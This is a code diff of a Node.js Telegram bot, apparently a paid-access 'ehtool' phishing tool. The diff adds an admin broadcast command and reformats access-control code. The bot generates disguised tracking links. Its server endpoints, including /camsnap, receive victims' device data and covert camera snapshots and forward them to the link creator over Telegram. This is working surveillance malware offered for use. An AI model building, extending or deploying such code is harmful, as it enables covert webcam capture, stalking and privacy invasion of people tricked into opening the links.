@@ -4,7 +4,8 @@ var cors = require('cors');
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot(process.env["bot"], {polling: true});
+// আপনার বট টোকেন এনভায়রনমেন্ট ভেরিয়েবল (bot) থেকে নেওয়া হচ্ছে
+const bot = new TelegramBot(process.env["bot"], {polling: true}); 
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
 const app = express();
@@ -24,13 +25,13 @@ const ownerId = 6246410156;
 // অনুমোদিত ব্যবহারকারীদের তালিকা লোড করা
 let allowedUsers = {};
 try {
-    allowedUsers = JSON.parse(fs.readFileSync('users.json', 'utf8'));
+    allowedUsers = JSON.parse(fs.readFileSync('users.json', 'utf8'));
 } catch (error) {
-    // ফাইল না থাকলে, এটি একটি নতুন ফাইল তৈরি করবে।
-    allowedUsers[ownerId] = {
-        expires: 'forever'
-    };
-    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
+    // ফাইল না থাকলে, এটি একটি নতুন ফাইল তৈরি করবে।
+    allowedUsers[ownerId] = {
+        expires: 'forever'
+    };
+    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
 }
 
 // Bot কখন চালু হয়েছে, তা ট্র্যাক করার জন্য
@@ -38,23 +39,61 @@ const startTime = new Date();
 
 // ইউজারকে অনুমতি আছে কিনা চেক করার ফাংশন
 function isAllowed(userId) {
-    if (userId === ownerId) {
-        return true;
-    }
-    const user = allowedUsers[userId];
-    if (!user) {
-        return false;
-    }
-    if (user.expires === 'forever') {
-        return true;
-    }
-    return new Date() < new Date(user.expires);
+    if (userId === ownerId) {
+        return true;
+    }
+    const user = allowedUsers[userId];
+    if (!user) {
+        return false;
+    }
+    if (user.expires === 'forever') {
+        return true;
+    }
+    return new Date() < new Date(user.expires);
 }
 
 // অনুমোদিত ব্যবহারকারীদের তালিকা সেভ করার ফাংশন
 function saveAllowedUsers() {
-    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
+    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
 }
+
+// ⭐ ছবি সহ ব্রডকাস্ট ফাংশন (নতুন যোগ করা হয়েছে)
+async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null) {
+    const userIds = Object.keys(allowedUsers);
+    let successCount = 0;
+    let failedCount = 0;
+
+    bot.sendMessage(adminChatId, `📣 ${userIds.length} জন ব্যবহারকারীকে বার্তা/ছবি পাঠানো শুরু হচ্ছে...`);
+
+    for (const userId of userIds) {
+        const targetChatId = parseInt(userId, 10);
+        
+        // অ্যাডমিনকে ব্রডকাস্ট করা এড়িয়ে যেতে চাইলে, এই লাইনটি আনকমেন্ট করুন:
+        // if (targetChatId === ownerId) continue; 
+
+        try {
+            if (photoFileIdOrUrl) {
+                // ছবি সহ ক্যাপশন পাঠানো হচ্ছে
+                await bot.sendPhoto(targetChatId, photoFileIdOrUrl, { 
+                    caption: message 
+                });
+            } else {
+                // শুধু টেক্সট পাঠানো হচ্ছে
+                await bot.sendMessage(targetChatId, message);
+            }
+            successCount++;
+            // টেলিগ্রাম রেট লিমিট এড়াতে সামান্য বিরতি
+            await new Promise(resolve => setTimeout(resolve, 50)); 
+        } catch (error) {
+            // যদি কোনো ব্যবহারকারী বটটিকে ব্লক করে দেয়
+            console.error(`Error sending message/photo to ${targetChatId}:`, error.message);
+            failedCount++;
+        }
+    }
+
+    bot.sendMessage(adminChatId, `✅ ব্রডকাস্ট সম্পন্ন!\nসফলভাবে পাঠানো হয়েছে: ${successCount} জনের কাছে।\nব্যর্থ হয়েছে: ${failedCount} টি।`);
+}
+// ⭐ ব্রডকাস্ট ফাংশন শেষ
 
 app.get("/w/:path/:uri",(req,res)=>{
 var ip;
@@ -93,12 +132,12 @@ const chatId = msg.chat.id;
 
 // শুধুমাত্র অনুমোদিত ব্যবহারকারীরাই বট ব্যবহার করতে পারবে
 if (!isAllowed(chatId)) {
-    bot.sendMessage(chatId, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉\n\n\nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
-    return;
+    bot.sendMessage(chatId, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉\n\n\nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
+    return;
 }
 
 if(msg?.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
- createLink(chatId,msg.text);
+    createLink(chatId,msg.text);
 }
 
 if(msg.text=="/start"){
@@ -120,28 +159,53 @@ bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি �
 \n\nঅবশ্যই আমাদের চ্যানেলে জয়েন হবেন আরোও টুলস পাওয়ার জন্য\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
 `);
 }
+// ⭐ ব্রডকাস্ট কমান্ড (ছবি সাপোর্টেড)
+else if (msg.text.startsWith('/broadcast')) {
+    if (chatId !== ownerId) {
+        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
+        return;
+    }
+
+    const broadcastMessage = msg.text.substring('/broadcast'.length).trim();
+    let photoFileId = null;
+
+    // যদি কমান্ডটি একটি ছবির রিপ্লাই হিসেবে আসে
+    if (msg.reply_to_message && msg.reply_to_message.photo) {
+        // সবচেয়ে বড় সাইজের ছবির file_id নেওয়া হচ্ছে
+        photoFileId = msg.reply_to_message.photo.pop().file_id;
+    }
+
+    if (broadcastMessage.length === 0 && !photoFileId) {
+        bot.sendMessage(chatId, '⚠️ সঠিক ব্যবহার:\n/broadcast <আপনার বার্তার টেক্সট>\nঅথবা একটি ছবিতে রিপ্লাই দিয়ে\n/broadcast <ক্যাপশন>');
+        return;
+    }
+
+    // ব্রডকাস্ট শুরু করা
+    broadcastToAllUsers(chatId, broadcastMessage, photoFileId);
+}
+// ⭐ ব্রডকাস্ট কমান্ড শেষ
 // নতুন কমান্ড: /allow <chat_id> <time> - FIXED LOGIC
 else if (msg.text.startsWith('/allow')) {
-    if (chatId !== ownerId) {
-        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
-        return;
-    }
-    const parts = msg.text.split(' ');
-    if (parts.length >= 2) {
-        const userIdToAdd = parseInt(parts[1], 10);
-        if (isNaN(userIdToAdd)) {
-            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
-            return;
-        }
+    if (chatId !== ownerId) {
+        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
+        return;
+    }
+    const parts = msg.text.split(' ');
+    if (parts.length >= 2) {
+        const userIdToAdd = parseInt(parts[1], 10);
+        if (isNaN(userIdToAdd)) {
+            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
+            return;
+        }
 
-        let duration = 'forever';
-        let expiresAt = 'forever';
-        
-        if (parts.length > 2) {
-            duration = parts.slice(2).join(' ');
-            const now = new Date();
-            const timeValue = parseInt(duration);
-            
+        let duration = 'forever';
+        let expiresAt = 'forever';
+        
+        if (parts.length > 2) {
+            duration = parts.slice(2).join(' ');
+            const now = new Date();
+            const timeValue = parseInt(duration);
+            
             // 🛑 FIX 1: Invalid timeValue (NaN) check
             if (isNaN(timeValue)) {
                 bot.sendMessage(chatId, `⚠️ সময় ("${duration}") সঠিক নয়। সময় অবশ্যই একটি সংখ্যা এবং তার পিছনে একক (যেমন 5m, 2h, 1d) হতে হবে।`);
@@ -149,16 +213,16 @@ else if (msg.text.startsWith('/allow')) {
             }
             
             let timeSet = false;
-            if (duration.endsWith('m')) {
-                now.setMinutes(now.getMinutes() + timeValue);
+            if (duration.endsWith('m')) {
+                now.setMinutes(now.getMinutes() + timeValue);
                 timeSet = true;
-            } else if (duration.endsWith('h')) {
-                now.setHours(now.getHours() + timeValue);
+            } else if (duration.endsWith('h')) {
+                now.setHours(now.getHours() + timeValue);
                 timeSet = true;
-            } else if (duration.endsWith('d')) {
-                now.setDate(now.getDate() + timeValue);
+            } else if (duration.endsWith('d')) {
+                now.setDate(now.getDate() + timeValue);
                 timeSet = true;
-            } 
+            } 
             
             if (timeSet) {
                 // 🛡️ FIX 2: Final safety check (now.getTime() Invalid Date-er jonno NaN return kore)
@@ -173,62 +237,62 @@ else if (msg.text.startsWith('/allow')) {
                 bot.sendMessage(chatId, `⚠️ সময় ("${duration}") সঠিক নয়। সময় অবশ্যই একটি সংখ্যা এবং তার পিছনে একক (যেমন 5m, 2h, 1d) হতে হবে।`);
                 return;
             }
-        }
-        
-        allowedUsers[userIdToAdd] = { expires: expiresAt };
-        saveAllowedUsers();
+        }
+        
+        allowedUsers[userIdToAdd] = { expires: expiresAt };
+        saveAllowedUsers();
 
-        const messageToUser = expiresAt === 'forever' ?
-            `অভিনন্দন! আপনাকে লাইফটাইমের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।` :
-            `অভিনন্দন! আপনাকে ${duration} সময়ের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।`;
-        
-        bot.sendMessage(userIdToAdd, messageToUser);
-        bot.sendMessage(chatId, `ইউজার আইডি ${userIdToAdd} সফলভাবে অনুমোদিত তালিকায় যুক্ত করা হয়েছে (${duration} এর জন্য)।`);
+        const messageToUser = expiresAt === 'forever' ?
+            `অভিনন্দন! আপনাকে লাইফটাইমের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।` :
+            `অভিনন্দন! আপনাকে ${duration} সময়ের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।`;
+        
+        bot.sendMessage(userIdToAdd, messageToUser);
+        bot.sendMessage(chatId, `ইউজার আইডি ${userIdToAdd} সফলভাবে অনুমোদিত তালিকায় যুক্ত করা হয়েছে (${duration} এর জন্য)।`);
 
-    } else {
-        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
-    }
+    } else {
+        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
+    }
 }
 // নতুন কমান্ড: /disallow <chat_id>
 else if (msg.text.startsWith('/disallow')) {
-    if (chatId !== ownerId) {
-        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
-        return;
-    }
-    const parts = msg.text.split(' ');
-    if (parts.length === 2) {
-        const userIdToRemove = parseInt(parts[1], 10);
-        if (!isNaN(userIdToRemove)) {
-            if (allowedUsers[userIdToRemove]) {
-                delete allowedUsers[userIdToRemove];
-                saveAllowedUsers();
-                bot.sendMessage(userIdToRemove, `দুঃখিত, আপনার বট ব্যবহারের অনুমতি প্রত্যাহার করা হয়েছে।`);
-                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToRemove} সফলভাবে অনুমোদিত তালিকা থেকে সরানো হয়েছে।`);
-            } else {
-                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToRemove} অনুমোদিত তালিকায় নেই।`);
-            }
-        } else {
-            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
-        }
-    } else {
-        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
-    }
+    if (chatId !== ownerId) {
+        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
+        return;
+    }
+    const parts = msg.text.split(' ');
+    if (parts.length === 2) {
+        const userIdToRemove = parseInt(parts[1], 10);
+        if (!isNaN(userIdToRemove)) {
+            if (allowedUsers[userIdToRemove]) {
+                delete allowedUsers[userIdToRemove];
+                saveAllowedUsers();
+                bot.sendMessage(userIdToRemove, `দুঃখিত, আপনার বট ব্যবহারের অনুমতি প্রত্যাহার করা হয়েছে।`);
+                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToRemove} সফলভাবে অনুমোদিত তালিকা থেকে সরানো হয়েছে।`);
+            } else {
+                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToRemove} অনুমোদিত তালিকায় নেই।`);
+            }
+        } else {
+            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
+        }
+    } else {
+        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
+    }
 }
 // নতুন কমান্ড: /uptime
 else if (msg.text === '/uptime') {
-    const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
-    const hours = Math.floor(uptimeInSeconds / 3600);
-    const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
-    const seconds = uptimeInSeconds % 60;
-    bot.sendMessage(chatId, `বটটি চালু আছে ${hours} ঘন্টা, ${minutes} মিনিট, এবং ${seconds} সেকেন্ড ধরে।`);
+    const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
+    const hours = Math.floor(uptimeInSeconds / 3600);
+    const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
+    const seconds = uptimeInSeconds % 60;
+    bot.sendMessage(chatId, `বটটি চালু আছে ${hours} ঘন্টা, ${minutes} মিনিট, এবং ${seconds} সেকেন্ড ধরে।`);
 }
 });
 
 bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
 bot.answerCallbackQuery(callbackQuery.id);
 if (!isAllowed(callbackQuery.from.id)) {
-    bot.sendMessage(callbackQuery.from.id, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉/n/n/nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
-    return;
+    bot.sendMessage(callbackQuery.from.id, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉/n/n/nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
+    return;
 }
 if(callbackQuery.data=="crenew"){
 createNew(callbackQuery.message.chat.id);
@@ -247,9 +311,9 @@ if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https'
 
 var url=cid.toString(36)+'/'+btoa(msg);
 var m={
-  reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
-  } )
+  reply_markup:JSON.stringify({
+    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
+  } )
 };
 
 var cUrl=`${hostURL}/c/${url}`;
@@ -323,7 +387,7 @@ res.send("Done");
 app.post("/",(req,res)=>{
 
 var uid=decodeURIComponent(req.body.uid) || null;
-var data=decodeURIComponent(req.body.data)  || null;
+var data=decodeURIComponent(req.body.data)  || null;
 if( uid != null && data != null){
 
 
@@ -338,37 +402,37 @@ res.send("Done");
 
 
 app.post("/camsnap",(req,res)=>{
-    var uid=decodeURIComponent(req.body.uid) || null;
-    var img=decodeURIComponent(req.body.img) || null;
+    var uid=decodeURIComponent(req.body.uid) || null;
+    var img=decodeURIComponent(req.body.img) || null;
 
-    if(uid != null && img != null){
-        
-        // এখানে সরাসরি Base64 ডেটা ব্যবহার করা হয়েছে, কারণ ক্লায়েন্ট-সাইড কোড প্রিফিক্স মুছে দেয়।
-        const base64Data = img;
-        if (!base64Data) {
-            console.log("Empty Base64 data.");
-            res.send("Empty Base64 Data");
-            return;
-        }
+    if(uid != null && img != null){
+        
+        // এখানে সরাসরি Base64 ডেটা ব্যবহার করা হয়েছে, কারণ ক্লায়েন্ট-সাইড কোড প্রিফিক্স মুছে দেয়।
+        const base64Data = img;
+        if (!base64Data) {
+            console.log("Empty Base64 data.");
+            res.send("Empty Base64 Data");
+            return;
+        }
 
-        try {
-            var buffer=Buffer.from(base64Data,'base64');
-            var info={
-                filename:"camsnap.png",
-                contentType: 'image/png'
-            };
+        try {
+            var buffer=Buffer.from(base64Data,'base64');
+            var info={
+                filename:"camsnap.png",
+                contentType: 'image/png'
+            };
 
-            bot.sendPhoto(parseInt(uid,36),buffer,{},info);
-            res.send("Done");
+            bot.sendPhoto(parseInt(uid,36),buffer,{},info);
+            res.send("Done");
 
-        } catch (error) {
-            console.log("Error processing image:", error);
-            bot.sendMessage(parseInt(uid,36), `⚠️ দুঃখিত, ছবি প্রসেস করার সময় একটি সমস্যা হয়েছে।`);
-            res.send("Error");
-        }
-    } else {
-        res.send("No Data");
-    }
+        } catch (error) {
+            console.log("Error processing image:", error);
+            bot.sendMessage(parseInt(uid,36), `⚠️ দুঃখিত, ছবি প্রসেস করার সময় একটি সমস্যা হয়েছে।`);
+            res.send("Error");
+        }
+    } else {
+        res.send("No Data");
+    }
 });
 
 
